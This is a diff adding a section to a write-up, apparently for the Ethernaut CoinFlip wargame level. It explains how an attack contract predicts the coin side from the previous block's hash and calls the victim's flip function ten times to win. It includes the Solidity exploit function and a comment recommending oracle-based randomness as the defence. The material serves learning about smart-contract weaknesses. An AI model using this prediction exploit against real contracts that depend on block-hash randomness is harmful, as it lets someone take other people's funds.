@@ -70,6 +70,36 @@ contract CoinFlipAttack {
         victimContract = CoinFlip(_victimContractAddr);
     }
 ```
+- finally the attack begins,
+- after the attack contract finds the value for the flip it is assigned to the call to the flip function of the victim contract,
+    - the player calls this flip function 10 times in a row to win.
+
+```Solidity
+
+/**  
+* @notice Blockhash and block.number are globally accessible variables available to everyone, 
+* this is the source of randomness and can be exploited in the attack to calculate the correct side of the coin flip.
+* The best practice in this case would be to introduce a source of randomness into a contract with a 
+* decentralized oracle to compute random numbers, because there is no native way to generate random numbers in 
+* Solidity and everything is publicly visible in the contract.
+*/
+/// @notice The attack contract can use the same process as the victim contract to find the value for the flip.
+function flip() public returns(bool) {
+  uint256 blockValue = uint256(blockhash(block.number.sub(1)));
+  
+  uint256 coinFlip = blockValue.div(FACTOR); 
+        
+  bool side = coinFlip == 1 ? true : false;
+
+  victimContract.flip(side);
+    }
+}
+
+```
+## 💥 Fire away at that flip button, ten times!
+![Screen Shot 2022-10-31 at 1 05 02 PM](https://user-images.githubusercontent.com/104662990/199078205-0c19814b-c867-46bf-8b1e-9404585037af.png)
+
+
 
     
     
